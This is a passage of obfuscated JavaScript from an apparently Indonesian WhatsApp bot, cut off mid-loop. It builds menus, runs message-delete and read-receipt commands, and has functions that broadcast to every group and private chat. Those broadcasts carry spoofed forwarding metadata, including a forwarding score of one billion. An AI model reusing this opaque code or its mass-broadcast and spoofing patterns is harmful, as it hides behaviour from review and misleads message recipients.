_0x46e5fd={};_0x46e5fd['title']='gacha\x20coga'+'n',_0x46e5fd[_0x39f25f(0x568,0x144,0x2f2,-0x2b3)+'n']=_0x1f7707(0xb8,-0x445,-0x11b,-0x209)+_0x1f7707(0x130,-0x2d4,-0x218,-0x16f)+_0x1f7707(0x1b1,0x16c,0x48b,0x654)+_0x1f7707(0x1a5,0x146,0x470,0x6a3)+'cha\x20cogan\x20'+_0x1f7707(0x7f,-0x150,-0x2be,-0x522),_0x46e5fd[_0x1f7707(-0x16b,-0x333,0x1a,-0x40)]='0';const _0x2d00e7={};_0x2d00e7['title']=_0x39f25f(-0x28f,0x187,-0x255,0x271)+'16',_0x2d00e7['rows']=[_0x46e5fd];const _0x59662c={};_0x59662c['title']=_0x1f7707(0x542,0x598,0x572,0x62c),_0x59662c[_0x39f25f(0xac,0x144,0x275,0xa4)+'n']='\x0a\x0a_choose\x20'+_0x1f7707(0x94,-0x2b0,-0x218,0xaa)+_0x1f7707(0x356,0x207,0x48b,0x373)+_0x1f7707(0x323,0x714,0x398,0x28)+_0x1f7707(0x358,0xd1,-0x11e,-0x431)+_0x39f25f(0x94c,0x4f5,0xf9,0x78c),_0x59662c['rowId']='0';const _0x5bdb3d={};_0x5bdb3d[_0x39f25f(-0x68,-0x118,-0x275,-0x19b)]=_0x1f7707(0x57,0x1d6,0x1ba,0x3ae)+'17',_0x5bdb3d['rows']=[_0x59662c];const _0x3aefb7={};_0x3aefb7[_0x1f7707(0x5f,0x37,-0x2c6,-0x350)]='animemenu',_0x3aefb7[_0x39f25f(0x335,0x144,-0x310,0x455)+'n']='\x0a\x0a_choose\x20'+_0x1f7707(0x1df,-0x19,-0x218,-0x5eb)+'u\x20want\x20to\x20'+_0x1f7707(0x6a7,0x858,0x48a,0x810)+_0x1f7707(0x22e,-0x482,-0xdc,-0x215)+_0x39f25f(0x295,0x1b,-0x377,0x70),_0x3aefb7['rowId']='0';const _0xbd315e={};_0xbd315e[_0x39f25f(-0x314,-0x118,-0x483,0x182)]=_0x1f7707(0x30c,0x352,0x34f,0x700)+'18',_0xbd315e['rows']=[_0x3aefb7];const _0x4484c9={};_0x4484c9[_0x1f7707(-0x4e5,-0x2e8,-0x2c6,-0x20b)]=_0x1f7707(-0x26e,0x344,0x12a,-0xa3),_0x4484c9[_0x1f7707(-0x2e5,0x2a4,-0x6a,-0x1e7)+'n']=_0x39f25f(-0x412,0x93,0x342,-0x256)+_0x39f25f(0x5a,-0x6a,0x26b,0x341)+_0x1f7707(0x5bf,0x859,0x48b,0x58b)+_0x39f25f(0x787,0x447,0x318,0x740)+_0x39f25f(0x897,0x441,0x520,0x4fb)+_0x1f7707(0x1ad,0x463,0x644,0x2a4),_0x4484c9[_0x1f7707(-0x2c3,-0x310,0x1a,-0x376)]='0';const _0x428ed8={};_0x428ed8['title']='🛒\x20Menu\x20ke-'+'19',_0x428ed8[_0x1f7707(-0x4a8,0x3f2,-0xc8,-0x191)]=[_0x4484c9];const _0x4c74c3={};_0x4c74c3[_0x1f7707(-0x13c,-0x1c5,-0x2c6,-0xb1)]=_0x39f25f(0x53d,0x5a7,0x87d,0x171)+'e',_0x4c74c3[_0x39f25f(-0x2e4,0x144,-0x12a,0x3d2)+'n']=_0x39f25f(0x335,0x93,0x3a6,-0x49)+_0x39f25f(-0x496,-0x6a,0x35f,-0x2cc)+_0x39f25f(0x655,0x639,0x24d,0x406)+_0x39f25f(0x705,0x29c,0x22f,0x557)+_0x39f25f(0x192,-0x16,-0x447,-0x124)+_0x39f25f(0x1a3,0x3dd,0x65a,0x5f6),_0x4c74c3[_0x39f25f(-0x154,0x1c8,0x2cb,0x4aa)]=_0x1f7707(0x669,0x18d,0x3f9,0x26)+'e';const _0x45f28b={};_0x45f28b[_0x1f7707(-0x37,-0xa4,-0x2c6,-0x6cf)]=_0x39f25f(0x5a0,0x395,0x4ed,0x660)+'cript\x20bot',_0x45f28b[_0x39f25f(-0x3c7,0xe6,-0x339,0x3fe)]=[_0x4c74c3];const _0x598faf={};_0x598faf[_0x39f25f(-0x59a,-0x118,-0x294,-0xdd)]=_0x1f7707(-0x6d,0x4d2,0x2be,0x360)+_0x1f7707(0x2b7,0x183,0x559,0x4ae),_0x598faf[_0x1f7707(0x285,-0x3fa,-0x6a,0x448)+'n']=_0x1f7707(0x356,0x18e,-0x11b,-0x148)+_0x39f25f(0x440,-0x6a,-0x2a3,-0x65)+_0x1f7707(0x46b,-0x2e,0x48b,0x20)+_0x1f7707(0x610,0x2de,0x228,-0x1a1)+_0x1f7707(0x4ff,0x7f,0x171,0x197)+_0x1f7707(-0x531,0x3b1,-0xeb,-0x161)+'\x20this\x20scri'+_0x1f7707(0x368,0x9b0,0x608,0x2fc),_0x598faf[_0x1f7707(0x34c,-0x129,0x1a,0x2a5)]='0';const _0x154535={};_0x154535[_0x1f7707(-0x24c,-0x5b8,-0x2c6,-0x92)]=_0x1f7707(0x64d,0x5a6,0x636,0x220)+_0x1f7707(0x267,0x6fa,0x58f,0x497),_0x154535[_0x39f25f(-0xbe,0xe6,-0x2bc,-0x286)]=[_0x598faf];const _0x309490={};_0x309490['title']=''+ucapannya2,_0x309490[_0x1f7707(0xc6,0x27f,-0x6a,-0x2cc)+'n']=_0x39f25f(0x2dc,-0x9d,0x13a,0xd4)+_0x39f25f(0x558,0x7b1,0x7a7,0x6da)+_0x1f7707(0x151,0x305,0x2ce,0x618)+_0x1f7707(0x2d4,-0x16c,0x14f,0x44c)+_0x1f7707(0x2d7,-0x1ae,0x2e0,-0x15d)+_0x39f25f(-0xb2,0x244,0x23d,0xf9)+'ih.\x20Don\x27t\x20'+_0x1f7707(0x223,0x337,0x2b2,0x4f8),_0x309490['buttonText']=_0x1f7707(0x3d,0x58c,0x4a8,0x29)+'E',_0x309490[_0x1f7707(0x254,0x62c,0x637,0x4c6)]=''+creator,_0x309490[_0x39f25f(-0x25,0x237,0x59f,0x43c)]=_0x1f7707(-0x5b,-0x4e0,-0x1f0,-0x56a)+_0x1f7707(0x5c7,-0xcc,0x181,0xc2),_0x309490[_0x1f7707(-0x4fc,-0x4db,-0x28b,-0x6aa)]=[_0x4864d6,_0x3dd9e7,_0x3725f5,_0x43cca5,_0x380060,_0x41948f,_0x5258bf,_0x5e8dc5,_0x214e26,_0x41f4c3,_0x1c1a0c,_0x5238ca,_0x2178c6,_0x3dbd23,_0x267c1c,_0x2caddb,_0x53df97,_0x2d00e7,_0x5bdb3d,_0xbd315e,_0x428ed8,_0x45f28b,_0x154535];const _0x25dfa4={};_0x25dfa4[_0x1f7707(0x359,0x6c2,0x456,0x735)+'e']=_0x309490;let pip=alpha['prepareMes'+'sageFromCo'+_0x1f7707(0x755,0x85f,0x602,0x683)](from,_0x25dfa4,{});const _0x23f27d={};_0x23f27d[_0x39f25f(0xa0b,0x74f,0x75e,0x520)]=!![],alpha[_0x1f7707(0x69e,-0x26,0x27f,0x36e)+_0x1f7707(-0x55f,-0x2c2,-0x23b,0x1ea)](pip,_0x23f27d);}if(subscribezeeoneofc==_0x39f25f(0x87c,0x693,0x421,0x8fb)){console[_0x1f7707(0x117,0x36b,0x3f1,0x1d4)](color(time,'magenta'),color(_0x1f7707(0x16e,0x45e,0x3ea,0x81e)+_0x1f7707(-0x207,-0x1f,-0x51,-0x71)+'support'));const _0x3625e8={};_0x3625e8[_0x39f25f(-0x362,-0x118,-0x63,-0x38c)]='Group\x20What'+_0x39f25f(0x8fb,0x66c,0x3e3,0xa0d),_0x3625e8[_0x1f7707(-0x493,-0x1a7,-0x6a,-0x2db)+'n']=_0x1f7707(-0x205,-0x1e2,-0x11b,-0x59f)+'this\x20if\x20yo'+_0x39f25f(0x6bc,0x639,0x48b,0x8f8)+_0x39f25f(0x827,0x3b9,0x7a6,0x4dd)+_0x39f25f(0x7e2,0x540,0x41f,0x59f),_0x3625e8['rowId']='0';const _0x779bdd={};_0x779bdd[_0x39f25f(0x18f,-0x118,0x238,-0x14f)]=_0x1f7707(0x7ab,0x64b,0x370,0x5ee)+'atsapp\x20bot',_0x779bdd[_0x39f25f(0x4a2,0xe6,0x1a3,-0x2d6)]=[_0x3625e8];const _0x56d200={};_0x56d200['title']=_0x39f25f(0x56c,0x2e0,0x5b4,-0xad)+_0x39f25f(0x367,0x713,0x79a,0x8bb),_0x56d200[_0x1f7707(-0x34c,0x2ab,-0x6a,-0x359)+'n']=_0x39f25f(-0x2ff,0x93,0x23d,0x101)+_0x39f25f(0x22e,-0x6a,0x330,-0x207)+'u\x20want\x20to\x20'+'join\x20the\x20g'+_0x39f25f(0x550,0x536,0x9a0,0x7b2)+_0x39f25f(0x72d,0x620,0x36b,0x59e),_0x56d200[_0x39f25f(0xc1,0x1c8,0x400,0x9e)]='0';const _0x5d2d58={};_0x5d2d58['title']=_0x39f25f(0x7ba,0x375,0x289,0x35e)+'phabot\x20',_0x5d2d58[_0x1f7707(0x319,0x12,-0xc8,-0x155)]=[_0x56d200];const _0x3b8a13={};_0x3b8a13[_0x1f7707(0x13f,-0x281,-0x2c6,0xca)]=_0x39f25f(0x674,0x2e0,-0x21,0x192)+_0x1f7707(-0x150,0x651,0x36c,0x46f),_0x3b8a13[_0x39f25f(0x319,0x144,0x34c,0x3a6)+'n']=_0x1f7707(0xea,-0x33,-0x11b,-0x123)+_0x39f25f(0x313,-0x6a,-0x7a,-0xd1)+_0x39f25f(0x947,0x639,0x4fa,0x8e4)+'join\x20the\x20g'+_0x1f7707(0x5d9,0x3f3,0x388,0xd6)+_0x39f25f(0x6a2,0x620,0x8e0,0x92d),_0x3b8a13[_0x39f25f(0x668,0x1c8,-0x295,0x4d9)]='0';const _0x5b6f50={};_0x5b6f50[_0x1f7707(-0x1ee,-0x310,-0x2c6,-0x2e0)]=_0x39f25f(0x3a2,0x5a5,0x742,0x575)+'phabot\x202',_0x5b6f50['rows']=[_0x3b8a13];const _0x5e55d2={};_0x5e55d2[_0x1f7707(-0x5b2,-0x300,-0x2c6,-0xb1)]=''+ucapannya2,_0x5e55d2[_0x1f7707(-0x25a,0x132,-0x6a,0x5b)+'n']=_0x1f7707(0x23d,0x1cf,0x681,0x815)+_0x1f7707(0x7e6,0xd4,0x48c,0x244)+'\x20official\x20'+_0x39f25f(-0xe7,0x162,0x407,0x20e)+'an\x20di\x20pili'+_0x39f25f(-0xe9,0x199,-0x1b,0x23a)+_0x1f7707(0x642,0x7f0,0x3b8,0x2b8)+'🤙',_0x5e55d2['buttonText']=_0x39f25f(0x566,0x656,0x770,0xad2)+'E',_0x5e55d2['footerText']=''+creator,_0x5e55d2[_0x1f7707(-0x23d,-0x25c,0x89,-0x33d)]='SINGLE_SEL'+'ECT',_0x5e55d2[_0x1f7707(-0x306,-0x2f6,-0x28b,-0x111)]=[_0x779bdd,_0x5d2d58,_0x5b6f50];const _0x1164b5={};_0x1164b5['listMessag'+'e']=_0x5e55d2;let pipi=alpha['prepareMes'+_0x39f25f(0x6f0,0x6f8,0x970,0x3fa)+_0x39f25f(0x657,0x7b0,0x4aa,0xb20)](from,_0x1164b5,{});const _0x4d78a3={};_0x4d78a3[_0x1f7707(0x787,0x4ad,0x5a1,0x508)]=!![],alpha['relayWAMes'+_0x1f7707(-0x50,0x191,-0x23b,-0x488)](pipi,_0x4d78a3);}const ini_bc_gc_bang=_0x1f49c5=>{const _0x527080={'MsAHH':function(_0x541601,_0x17f9af){return _0x541601(_0x17f9af);},'FuelC':_0x281b03(0x874,0x777,0xbe0,0x56d)+_0x281b03(0x700,0x438,0x18e,0x582)+'oba\x20bebera'+_0x281b03(0xa33,0x5c4,0x834,0xa54)+'gi','agPyR':function(_0x4fa83c,_0x3ef765){return _0x4fa83c===_0x3ef765;},'fNBsJ':_0x52beff(0x274,0x368,0x5e5,0x23a),'NyVnz':_0x281b03(0x205,0x51d,0x4d9,0xf5)};var _0x25da47=alpha[_0x52beff(0x2c,0x35c,-0xc8,-0x170)][_0x281b03(0xd7a,0xb17,0x8e1,0xbda)]()[_0x52beff(0x244,0x608,0xd1,0x439)](_0xd4deea=>_0xd4deea[_0x52beff(0x20e,-0x1a9,0x1c2,0x197)][_0x281b03(0x1d1,0x4b6,0x48c,0x1ca)](_0x52beff(-0x6f,-0x319,0x286,-0x3f1)));function _0x52beff(_0x1cf5cd,_0xa31d1,_0x27e982,_0x4eed02){return _0x39f25f(_0xa31d1,_0x1cf5cd- -0xaa,_0x27e982-0xce,_0x4eed02-0xf2);}let _0xcc9a93=_0x1f49c5;function _0x281b03(_0x100bca,_0x58d381,_0x2e2f38,_0x3d09a4){return _0x39f25f(_0x3d09a4,_0x58d381-0x2d0,_0x2e2f38-0x107,_0x3d09a4-0x29);}for(let _0x563121 of _0x25da47){if(_0x527080[_0x52beff(-0x92,-0x184,-0x162,0x364)](_0x527080['fNBsJ'],'AWOYb'))_0x527080['MsAHH'](_0x32ca80,_0x527080[_0x281b03(0x701,0x567,0x51a,0x47f)]);else{const _0x34dd79={};_0x34dd79[_0x281b03(0x3a4,0x2d0,0x58f,0x5dc)+'t']=_0x281b03(0x238,0x255,0x3b9,0x3da);const _0x3cf0a2={};_0x3cf0a2['buttonId']=_0x527080[_0x52beff(0x154,-0x58,-0x281,-0x209)],_0x3cf0a2[_0x281b03(0x2e6,0x64c,0x673,0x2bd)]=_0x34dd79,_0x3cf0a2[_0x281b03(0x8fd,0x99e,0xc71,0x93f)]=0x1;const _0x43e5a8={};_0x43e5a8[_0x281b03(0x506,0x2d0,-0x1b6,0x58d)+'t']=_0x52beff(0x572,0x5c4,0x685,0x9d6)+'a';const _0xaaefe1={};_0xaaefe1[_0x281b03(0x6a4,0x917,0x850,0xd69)]='sewa_kak',_0xaaefe1['buttonText']=_0x43e5a8,_0xaaefe1['type']=0x1;var _0x38b834=[_0x3cf0a2,_0xaaefe1];const _0xa7d967={};_0xa7d967['contentTex'+'t']=_0x281b03(0xa19,0x61d,0x1a1,0x6b7)+'*'+enter+enter+_0xcc9a93,_0xa7d967['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0xa7d967[_0x281b03(0x9ae,0x869,0x4ac,0x845)]=_0x38b834,_0xa7d967[_0x281b03(0xb2d,0x933,0x9e7,0x7d6)]=0x1;var _0x5250b6=_0xa7d967;const _0x3fdcde={};_0x3fdcde[_0x52beff(0x322,0x750,0x606,0x39a)]='hi',_0x3fdcde[_0x52beff(0x610,0x229,0x15e,0x592)+_0x281b03(0x5c3,0x47e,0x3c4,0x7bc)]=0x3b9aca00,_0x3fdcde[_0x52beff(-0x4d,-0x125,-0x2f0,0x2b0)+'d']=!![],_0x3fdcde[_0x52beff(0x5de,0x806,0x9f7,0x47b)+_0x281b03(0x2b2,0x596,0x58d,0x3ff)]=!![];const _0x454ef0={};_0x454ef0[_0x52beff(0x72,0x162,-0x13f,-0x2a2)]=_0x281b03(0x5be,0x399,0x193,0x593)+'21',_0x454ef0[_0x52beff(0x633,0x4d2,0x5c9,0x3e7)+'o']=_0x3fdcde,_0x454ef0[_0x281b03(-0x54,0x3d6,0x434,0x137)]=ftroli,_0x454ef0['sendEpheme'+_0x281b03(0x8b9,0x596,0x803,0x920)]=!![],alpha[_0x281b03(0x4a7,0x24c,-0x46,0x679)+'e'](_0x563121[_0x281b03(0x44d,0x588,0x312,0x726)],_0x5250b6,MessageType[_0x52beff(0x169,0x431,0x47d,0x483)+'sage'],_0x454ef0);}}},ini_bc_pc_bang=_0x38ea7b=>{const _0x51c2c8={};_0x51c2c8['OpqBj']=_0x569855(0x959,0x627,0x498,0x268),_0x51c2c8['udzed']=_0x5e7d6e(-0xc3,0x3d9,-0x28,-0x411);function _0x569855(_0x1bed98,_0x167d56,_0x1bf101,_0x3de369){return _0x1f7707(_0x1bed98-0x104,_0x3de369,_0x167d56-0x588,_0x3de369-0x102);}_0x51c2c8[_0x5e7d6e(0x3fd,0x3f4,0x4ac,0x4c5)]=_0x5e7d6e(0x364,0x5ea,0x481,0x51f),_0x51c2c8['OmrSx']='🔖\x20Sewa\x20',_0x51c2c8[_0x569855(0x4b6,0x502,0x3c1,0x988)]='Botwea\x20©2k'+'21';const _0x16ba6d=_0x51c2c8;function _0x5e7d6e(_0x35da00,_0x147672,_0x512395,_0x330c41){return _0x39f25f(_0x330c41,_0x512395-0x53,_0x512395-0x29,_0x330c41-0x0);}var _0x1f74e9=alpha['chats'][_0x569855(0xa81,0xc21,0xd1a,0x773)]();let _0xe332b1=_0x38ea7b;for(let _0x529c0a of _0x1f74e9){const _0x1c2ba4={};_0x1c2ba4[_0x5e7d6e(0x474,0x505,0x69a,0x28d)]=_0x16ba6d[_0x5e7d6e(0x3d5,0x120,0x5ab,0x423)],_0x1c2ba4['buttonText']={},_0x1c2ba4[_0x569855(0x972,0xaa8,0xcbb,0xcbc)]=0x1,_0x1c2ba4['buttonText']['displayTex'+'t']=_0x16ba6d['udzed'];const _0x3a5f99={};_0x3a5f99[_0x569855(0xd6d,0xa21,0x922,0xc14)]=_0x16ba6d[_0x569855(0x854,0x833,0x4a0,0x48f)],_0x3a5f99[_0x569855(0x993,0x756,0x390,0x913)]={},_0x3a5f99['type']=0x1,_0x3a5f99[_0x569855(0x993,0x756,0x390,0x913)]['displayTex'+'t']=_0x16ba6d['OmrSx'];var _0x5aaf88=[_0x1c2ba4,_0x3a5f99];const _0xa5182b={};_0xa5182b['contentTex'+'t']=_0x569855(0x26e,0x727,0x682,0x438)+'*'+enter+enter+_0xe332b1,_0xa5182b[_0x569855(0x789,0xbbf,0x8ee,0xaf9)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0xa5182b[_0x5e7d6e(0x5a1,0x816,0x5ec,0x557)]=_0x5aaf88,_0xa5182b[_0x5e7d6e(0x464,0x331,0x6b6,0x778)]=0x1;var _0x30ea65=_0xa5182b;const _0xc3fabd={};_0xc3fabd[_0x569855(0x8f7,0x7a6,0xb48,0x521)]='hi',_0xc3fabd[_0x5e7d6e(0x5ec,0x2db,0x70d,0x76e)+_0x569855(0x28b,0x588,0x2ea,0x647)]=0x3b9aca00,_0xc3fabd[_0x5e7d6e(0x3ee,0x41c,0xb0,0x1cb)+'d']=!![],_0xc3fabd[_0x5e7d6e(0x9cb,0x8c4,0x6db,0x951)+_0x5e7d6e(0x6c1,0x436,0x319,0x649)]=!![];const _0x1a4cfa={};_0x1a4cfa[_0x569855(0x285,0x4f6,0x8cb,0x53e)]=_0x16ba6d[_0x569855(0x47,0x502,0x79c,0x678)],_0x1a4cfa[_0x569855(0x8e2,0xab7,0x97e,0x7a7)+'o']=_0xc3fabd,_0x1a4cfa[_0x5e7d6e(0x189,0x1f5,0x159,0x522)]=ftroli,_0x1a4cfa[_0x5e7d6e(0x6c6,0x6c5,0x6db,0x808)+_0x5e7d6e(-0x3d,0x254,0x319,0x17b)]=!![],alpha[_0x569855(0x2c3,0x356,0x198,0x226)+'e'](_0x529c0a[_0x569855(0x684,0x692,0xa6f,0xa70)],_0x30ea65,MessageType['buttonsMes'+'sage'],_0x1a4cfa);}};switch(command){case'q':if(!mek[_0x1f7707(-0x4cc,0x72,-0x8b,-0x47c)][_0x1f7707(0x1cf,0x63,0x310,0x477)]&&!isOwner&&!isCreator)return reply(lang[_0x1f7707(0x9a,0x4d1,0xd9,-0xe2)]());if(!m[_0x1f7707(-0x1b0,0x29a,-0xa8,0x8b)])return reply(_0x1f7707(0x6fd,0x955,0x619,0x694)+_0x1f7707(-0x37f,0x12e,-0x1c7,0x103));let qse=alpha['serializeM'](await m[_0x1f7707(0x4bf,-0x58,0x312,0x711)+'bj']());if(!qse['quoted'])return reply(_0x39f25f(0x6e0,0x3f7,-0x4,0x6f6)+_0x39f25f(0x413,-0x35,-0xe,-0x1ba)+_0x1f7707(-0x463,0xac,0x2e,0x429)+_0x1f7707(-0x153,0x397,-0xf4,0x2c9)+_0x39f25f(0x281,-0x9b,0x1ae,-0x4e7));await qse['quoted'][_0x39f25f(0xa4f,0x797,0x9d7,0xa46)+'rd'](m[_0x39f25f(-0x3d8,-0x10f,0x60,-0x44c)],!![]);break;case _0x1f7707(0x492,0x23f,0x3a8,0x1e8):case _0x39f25f(0x291,0x431,0x7a6,0x7b7):case'd':try{if(!isQuotedMsg)return reply('Reply\x20pesa'+_0x39f25f(0x7f5,0x789,0x97f,0xaa6));const _0x1cfb58={};_0x1cfb58['id']=mek[_0x39f25f(0x90,-0xdc,-0x1a6,-0x77)]['extendedTe'+'xtMessage'][_0x1f7707(0x67f,0x40f,0x52f,0x2c7)+'o']['stanzaId'],_0x1cfb58[_0x39f25f(-0x62,0x3d9,0x38e,0x75e)]=from,_0x1cfb58[_0x1f7707(0x588,-0x67,0x310,0x618)]=!![],pp=_0x1cfb58;if(!isGroupAdmins&&!mek['key'][_0x1f7707(0x5d1,0x35b,0x310,0x4ce)]&&!isOwner&&!isCreator)return reply(mess['only']['admin']);alpha[_0x1f7707(0x3f3,0x5b8,0x261,-0x22)+_0x1f7707(0x3c1,0x2c9,0x604,0x53b)](from,pp);}catch(_0x1ca0c8){reply(_0x1f7707(0x79c,0x57b,0x429,-0x66)+_0x39f25f(-0x35b,0x116,0x4c3,0x71)),reply(_0x1ca0c8),console[_0x39f25f(0x6b2,0x59f,0xa54,0x10f)](_0x1ca0c8);}break;case _0x1f7707(0x2d2,0x171,0x2ad,0x452):try{if(!isGroup)return reply(_0x39f25f(-0x143,-0x7d,-0x434,-0x3de)+'\x20didalam\x20g'+_0x39f25f(0x367,0x2fe,0x676,0x2fa));if(!isQuotedMsg)return reply('Reply\x20pesa'+_0x39f25f(-0xd5,0x2e3,0x1ae,-0xc6));infom=await alpha[_0x1f7707(-0x5ba,0x14f,-0x244,0x9b)+'o'](from,mek['message'][_0x39f25f(-0x2a4,0x6,0x34e,0x3c4)+_0x1f7707(0xe3,0xf8,0x38d,0x303)][_0x1f7707(0x7fe,0x756,0x52f,0x1df)+'o'][_0x1f7707(-0x628,0x24b,-0x220,-0x4c8)]),hemm=infom[_0x1f7707(-0x28e,-0xb7,-0x8c,-0x37f)],hemms=infom[_0x1f7707(0x6ac,0x51d,0x4c8,0x347)],readon=hemms[_0x1f7707(-0x24c,0x268,-0x1d1,0x214)](_0x1e13f3=>_0x1e13f3[_0x1f7707(0x1d,0x3e3,0x10a,-0x39f)]),readdin=hemm[_0x39f25f(0x50,-0x23,0x1b8,0x7c)](_0x9afc20=>_0x9afc20[_0x39f25f(0x284,0x2b8,-0x8c,-0x153)]),stamp=hemm['map'](_0x3cd701=>_0x3cd701['t']);function toTime(_0x1f43d5,_0x75ecbf){const _0x1b9548={};function _0x3b430e(_0x251ce1,_0x398d04,_0x44bc71,_0x1510db){return _0x39f25f(_0x44bc71,_0x1510db-0x106,_0x44bc71-0x163,_0x1510db-0xdd);}_0x1b9548['iQvOG']=function(_0x28ff8c,_0x5d060f){return _0x28ff8c==_0x5d060f;},_0x1b9548[_0x3b430e(0x5f8,0x951,0x82e,0x7cd)]='undefined';function _0x36a80b(_0x16307d,_0x29758b,_0xdee14,_0x30b064){return _0x1f7707(_0x16307d-0x19b,_0x30b064,_0x29758b-0x459,_0x30b064-0x4a);}_0x1b9548['ghswn']=function(_0x118673,_0xe1a324){return _0x118673*_0xe1a324;};const _0x26f54a=_0x1b9548;_0x75ecbf=_0x26f54a['iQvOG'](typeof _0x75ecbf,_0x26f54a[_0x3b430e(0xa05,0x65b,0xbbd,0x7cd)])?![]:!![];let _0x293ad5=new Date(_0x1f43d5);_0x75ecbf&&(_0x293ad5=new Date(_0x26f54a[_0x3b430e(0x416,0x71b,0x890,0x598)](_0x1f43d5,-0xfce+-0x1b4f+-0x1*-0x2f05)));var _0x3b0dfa=_0x293ad5[_0x3b430e(0x39f,0x322,0x8b3,0x727)](),_0x471d6c=_0x293ad5[_0x36a80b(0x14b,0x1b5,0x1b,0x665)](),_0x471e7c=_0x293ad5[_0x36a80b(0x63d,0xad3,0xcaf,0x80f)](),_0x23cdaa=_0x3b0dfa+':'+_0x471d6c+':'+_0x471e7c;return _0x23cdaa;}function toBulan(_0x398a98,_0x3632f9){const _0x440f8a={};_0x440f8a[_0x17f293(0x772,0x39e,0x6f9,0x6b1)]=_0x17f293(0x861,0xc7f,0xcb4,0x90a),_0x440f8a['EgAgH']=function(_0x4359ee,_0x57225e){return _0x4359ee*_0x57225e;},_0x440f8a[_0x31f916(0x45b,0xa63,0x75f,0x65b)]=_0x31f916(0x9f9,0x455,0x85f,0x84a),_0x440f8a['wlqgh']='Februari',_0x440f8a[_0x17f293(0xbce,0x8e0,0x7b4,0x712)]='Maret';function _0x17f293(_0x7268d4,_0x295c8b,_0x1f4a04,_0x5c9a4d){return _0x39f25f(_0x7268d4,_0x5c9a4d-0x1ec,_0x1f4a04-0x1e3,_0x5c9a4d-0xa0);}_0x440f8a[_0x31f916(0x84e,0xcc1,0xa8b,0x7fa)]='April',_0x440f8a['HeRoW']=_0x31f916(0x361,0x4f8,0x5fb,0x632),_0x440f8a['GPocc']=_0x31f916(0x9d5,0x99d,0x935,0xb85),_0x440f8a['HqqKE']=_0x17f293(0x74c,0x21e,0x308,0x5d7),_0x440f8a[_0x17f293(0x55b,0x783,0x3a2,0x61b)]='Nopember',_0x440f8a[_0x31f916(0xfc7,0xb7b,0xd54,0xea4)]=_0x31f916(0xd56,0x1200,0xd8f,0x11c7),_0x440f8a[_0x31f916(0xcbd,0xd9f,0x922,0xb76)]=_0x31f916(0x4cb,0x64f,0x6a4,0x4d4),_0x440f8a[_0x31f916(0x9c1,0x8ec,0xace,0xb76)]=_0x31f916(0x6ed,0x827,0xba0,0xdab),_0x440f8a['LpNRP']=_0x17f293(0x171,0x43e,-0x1db,0xe0),_0x440f8a[_0x17f293(0x41e,0x9e4,0xd21,0x8dc)]='Sabtu',_0x440f8a['ivKzJ']=function(_0xc94e8c,_0x4bb756){return _0xc94e8c<_0x4bb756;},_0x440f8a[_0x17f293(0x638,0x6d5,0x4a4,0x662)]=function(_0x2095b2,_0xf83633){return _0x2095b2+_0xf83633;};const _0x19f6a0=_0x440f8a;_0x3632f9=typeof _0x3632f9==_0x19f6a0[_0x31f916(0xd71,0x922,0xa17,0xcc1)]?![]:!![];let _0x5596e4=new Date(_0x398a98);_0x3632f9&&(_0x5596e4=new Date(_0x19f6a0[_0x31f916(0xe05,0xc8e,0x952,0xd96)](_0x398a98,-0x2a9+-0x1*0x2063+-0xc*-0x33f)));var _0x569e3b=[_0x19f6a0[_0x17f293(0x7c2,0x3c7,0x662,0x3f9)],_0x19f6a0[_0x31f916(0x9ba,0x860,0x861,0x765)],_0x19f6a0[_0x31f916(0xdaa,0x804,0xa78,0x639)],_0x19f6a0['sfCzY'],_0x17f293(0x6a,-0x1a1,-0xd1,0x25e),_0x19f6a0[_0x17f293(0x533,0xb01,0x3ce,0x66d)],'Juli',_0x19f6a0[_0x31f916(0x8a7,0x9f6,0x590,0x10f)],_0x31f916(0xdb9,0x7b1,0xb39,0xd72),_0x19f6a0[_0x31f916(0x258,0xac1,0x6b3,0x7bc)],_0x19f6a0[_0x31f916(0xb90,0xbf3,0x981,0x7fb)],_0x19f6a0[_0x31f916(0x10ec,0xb15,0xd54,0x10ae)]],_0x6dcae7=[_0x31f916(0xb4a,0x963,0xbbb,0xd36),_0x31f916(0x1e7,0x412,0x4fc,0x13d),_0x19f6a0[_0x31f916(0x513,0xad9,0x922,0xc1d)],_0x31f916(0x88f,0xdc9,0xd30,0x11ac),_0x19f6a0[_0x31f916(0x88e,0x71c,0xace,0x919)],_0x19f6a0[_0x31f916(0x4aa,0x823,0x797,0xa00)],_0x19f6a0[_0x31f916(0x8ab,0xa8b,0xc42,0xb0e)]],_0x3418c1=_0x5596e4[_0x31f916(0xdd1,0x965,0x97d,0x4e4)]();bulanee=_0x5596e4[_0x31f916(0x700,0xdb8,0x9e8,0xb92)]();var _0x2ea794=_0x5596e4[_0x31f916(0xd2d,0x8e9,0x882,0x4ff)](),_0x2ea794=_0x6dcae7[_0x2ea794],_0x434e97=_0x5596e4['getYear'](),_0x11233d=_0x19f6a0[_0x17f293(0x534,0x772,0x5c,0x36e)](_0x434e97,-0x1516*0x1+-0x250b*-0x1+-0x1*0xc0d)?_0x19f6a0[_0x31f916(0x860,0x9f1,0x9c8,0x5fb)](_0x434e97,0xb6+-0x1dcd*0x1+0x1*0x2483):_0x434e97;function _0x31f916(_0x57a30c,_0x319ed7,_0x32e022,_0x39b43a){return _0x1f7707(_0x57a30c-0x1d3,_0x57a30c,_0x32e022-0x700,_0x39b43a-0x8e);}var _0x54fa56=_0x2ea794+',\x20'+_0x3418c1+_0x17f293(0x612,0x6c5,0x6ec,0x660)+_0x569e3b[bulanee]+_0x31f916(0x5c2,0x62e,0x9c6,0x61f)+_0x11233d;return _0x54fa56;}teksx=_0x1f7707(0xa8c,0x8cb,0x5df,0x5de)+enter;for(let i of hemm){teksx+=_0x39f25f(0x2d0,0x393,0x76d,0x478)+i['jid'][_0x1f7707(0x218,-0x11b,0x20e,0xbb)]('@')[0x448*0x1+0x1c6*-0x12+-0xf4*-0x1d]+enter+'📍\x20Waktu\x20:\x20'+toTime(i['t'],!![])+enter+(_0x1f7707(0x15e,-0xae,0x380,0x4a7)+':\x20')+toBulan(i['t'],!![])+enter+'•'+enter;}teksx1=_0x1f7707(-0x576,0x4e,-0x2ca,-0x7d)+'D*'+enter+enter;for(let i of 